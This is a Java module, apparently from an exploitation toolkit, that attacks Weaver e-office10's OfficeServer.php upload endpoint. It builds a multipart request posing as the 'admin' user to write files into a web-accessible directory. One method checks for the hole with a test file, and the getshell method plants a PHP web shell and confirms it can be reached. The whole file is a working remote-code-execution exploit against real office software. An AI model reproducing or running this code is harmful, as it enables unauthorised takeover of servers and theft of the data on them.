package exp.oa.weaveroa;

import core.Exploitlnterface;
import java.util.HashMap;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class weaveroa_eoffice10_OfficeServer implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url,textArea,"nishizhu.txt",shell.Testpath);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return att(url,textArea,"nishizhu.php",shell.Phppath);
    }

    private Boolean att(String url,TextArea textArea,String filename,String path){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew");
        String payload = "------WebKitFormBoundaryLpoiBFy4ANA8daew\r\n" +
                "Content-Disposition: form-data;name=\"FileData\";filename=\"test.php\"\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "\r\n" +
                shell.readFile(path) + "\r\n" +
                "\r\n" +
                "------WebKitFormBoundaryLpoiBFy4ANA8daew\r\n" +
                "Content-Disposition: form-data;name=\"FormData\"\r\n" +
                "\r\n" +
                "{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'" + filename + "'}\r\n" +
                "------WebKitFormBoundaryLpoiBFy4ANA8daew--\r\n";
        Response post = HttpTools.post(url + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php", payload, head, "utf-8");
        if(post.getCode() == 200){
            Response response = HttpTools.get(url + "/eoffice10/server/public/iWebOffice2015/Document/" + filename, new HashMap<String, String>()
                    , "utf-8");

            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                textArea.appendText("\n 测试文件写入 \n" + url + "/eoffice10/server/public/iWebOffice2015/Document/" +filename);
                return true;
            }else {
                textArea.appendText("\n 若txt文件写入成功则为WAF拦截 请手动复现或修改shell");
                return false;
            }
        }else {
            textArea.appendText("\n e-office10 OfficeServer.php-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
